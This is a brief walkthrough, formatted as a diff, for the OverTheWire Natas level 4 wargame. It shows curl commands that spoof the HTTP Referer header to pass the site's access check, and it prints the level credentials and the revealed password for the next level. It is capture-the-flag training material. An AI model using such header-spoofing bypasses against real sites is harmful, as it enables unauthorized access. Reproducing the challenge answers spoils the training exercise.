@@ -1,0 +1,8 @@
+curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org/
+
+The result says that the website has to come from http://natas5.natas.labs.overthewire.org/ in the HTTP protocol that is the referer, we can do this in curl by executing this command
+
+
+curl -e http://natas5.natas.labs.overthewire.org/ -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org/
+
+Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
